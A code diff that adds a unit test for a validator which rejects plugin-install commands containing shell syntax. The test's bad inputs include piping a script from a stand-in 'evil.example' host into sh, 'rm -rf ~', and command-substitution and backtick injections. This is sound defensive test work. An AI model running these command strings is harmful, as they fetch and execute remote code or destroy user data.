@@ -125,6 +125,31 @@ test('packagesBlockFor rejects oversize text, multiline commands, bad sources, b
   assert.throws(() => packagesBlockFor({ packages: [] }), /non-empty packages array/);
 });
 
+test('packagesBlockFor refuses copyable commands that carry shell syntax', () => {
+  const withCommand = (command) =>
+    commandRecord({ packages: [{ profile: 'web', install: 'x', source: 'npm:x', command }] });
+  for (const bad of [
+    'dsh plugin add x; curl https://evil.example/i.sh | sh',
+    'dsh plugin add x && rm -rf ~',
+    'dsh plugin add x $(curl evil)',
+    'dsh plugin add x `id`',
+    'dsh plugin add "x',
+    'dsh plugin add "x$HOME"',
+    'dsh plugin add x \\',
+  ]) {
+    assert.throws(() => packagesBlockFor(withCommand(bad)), /paste-safe whitelist/, bad);
+  }
+  // Real shapes from the mapping stay valid: runner prefixes, env prefixes,
+  // flags with values, and quoted github refs with &path selectors.
+  for (const [install, source, command] of [
+    ['x', 'npm:x', 'DSH_HOME=~/.ohdsh npx @deepseek-ai/dsh plugin --profile desktop add x'],
+    ['x@1.2.6', 'npm:x@1.2.6', 'dsh plugin --profile tui add --config.enable-global-virtual-store=false x@1.2.6'],
+    ['https://github.com/o/r#main&path:/p', 'github:o/r#main&path:/p', 'dsh plugin --profile web add "github:o/r#main&path:/p"'],
+  ]) {
+    assert.doesNotThrow(() => packagesBlockFor(commandRecord({ packages: [{ profile: 'web', install, source, command }] })), command);
+  }
+});
+
 test('packagesBlockFor demands install === installRef(source) and token-level command agreement', () => {
   const pkg = (overrides) => ({ profile: 'web', ...overrides });
   // install must be the installRef of its source: a wrong name the command
